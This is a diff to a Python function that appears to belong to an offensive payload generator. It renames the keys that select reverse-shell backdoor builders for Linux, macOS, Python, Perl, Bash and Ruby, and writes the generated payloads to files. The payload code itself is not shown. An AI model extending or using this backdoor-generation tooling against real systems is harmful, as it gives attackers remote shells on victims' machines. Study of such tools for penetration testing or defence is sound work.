@@ -12,15 +12,15 @@ def process( data, HOST, PORT, logger=True):
 		logfile = logger
 
 
-	if data == "linux/x86/reverse_tcp":
+	if data == "backdoors/linux86/reverse_tcp":
 		from .backdoors.main import linx86reverse_tcp
 		extension = "elf"
 		logs = linx86reverse_tcp( HOST,PORT)
-	elif data == "osx/x86/reverse_tcp":
+	elif data == "backdoors/osx86/reverse_tcp":
 		from .backdoors.main import macosx86reverse_tcp
 		extension = "macho"
 		logs = macosx86reverse_tcp( HOST,PORT)
-	elif data == "linux/x64/reverse_tcp":
+	elif data == "backdoors/linux64/reverse_tcp":
 		from .backdoors.main import linx64reverse_tcp
 		extension = "elf"
 		logs = linx64reverse_tcp( HOST,PORT)
@@ -34,29 +34,29 @@ def process( data, HOST, PORT, logger=True):
 
 
 
-	elif data == "php/reverse_tcp":
+	elif data == "backdoors/php/reverse_tcp":
 		pass
-	elif data == "asp/reverse_tcp":
+	elif data == "backdoors/asp/reverse_tcp":
 		pass
-	elif data == "jsp/reverse_tcp":
+	elif data == "backdoors/jsp/reverse_tcp":
 		pass
-	elif data == "war/reverse_tcp":
+	elif data == "backdoors/war/reverse_tcp":
 		pass
 
 
-	elif data == "unix/python/reverse_tcp":
+	elif data == "backdoors/unix/python/reverse_tcp":
 		from .backdoors.main import pyreverse_tcp
 		extension = "py"
 		logs = pyreverse_tcp( HOST,PORT)
-	elif data == "unix/perl/reverse_tcp":
+	elif data == "backdoors/unix/perl/reverse_tcp":
 		from .backdoors.main import plreverse_tcp
 		extension = "pl"
 		logs = plreverse_tcp( HOST,PORT)
-	elif data == "unix/bash/reverse_tcp":
+	elif data == "backdoors/unix/bash/reverse_tcp":
 		from .backdoors.main import shreverse_tcp
 		extension = "sh"
 		logs = shreverse_tcp( HOST,PORT)
-	elif data == "unix/ruby/reverse_tcp":
+	elif data == "backdoors/unix/ruby/reverse_tcp":
 		from .backdoors.main import rbreverse_tcp
 		extension = "rb"
 		logs = rbreverse_tcp( HOST,PORT)
@@ -64,10 +64,10 @@ def process( data, HOST, PORT, logger=True):
 
 	savefile = [logfile if logger != True else logfile+extension]
 	if data in [
-				"linux/x86/reverse_tcp",
-				"osx/x86/reverse_tcp",
-				"osx/x64/reverse_tcp",
-				"windows/x86/reverse_tcp"
+				"backdoors/linux86/reverse_tcp",
+				"backdoors/osx86/reverse_tcp",
+				"backdoors/osx64/reverse_tcp",
+				"backdoors/windowsx86/reverse_tcp"
 				]:
 
 		exploit = open(savefile[0], "wb")
